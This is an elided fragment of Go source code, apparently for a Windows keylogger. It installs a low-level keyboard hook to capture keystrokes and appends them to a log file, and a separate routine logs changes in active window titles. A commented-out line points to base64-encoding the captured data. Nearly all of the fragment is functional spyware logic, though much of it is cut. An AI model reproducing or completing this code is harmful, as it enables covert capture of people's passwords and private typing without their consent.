...
func (w Writer) write(s string) {
	//w.file.WriteString(base64Encode(s))
...
func WindowLogger(keyloggerFilePath string) {
	...
	for {
		...
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				...
				file, err := os.OpenFile(keyloggerFilePath,os.O_APPEND|os.O_WRONLY, 0644)
...
func Keylogger(keyloggerFilePath string) {
	if _, err := os.Stat(keyloggerFilePath); os.IsNotExist(err) {
  		CreateKeylogFile(keyloggerFilePath)
	}
	var msg MSG
	...
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
			...
			if tmpKeylog != "" {
				...
				if write {
					file, _ := os.OpenFile(keyloggerFilePath,os.O_APPEND|os.O_WRONLY, 0644)
					_, _ = file.WriteString(tmpKeylog)
				}
				precLog = tmpKeylog
				tmpKeylog = ""
			}
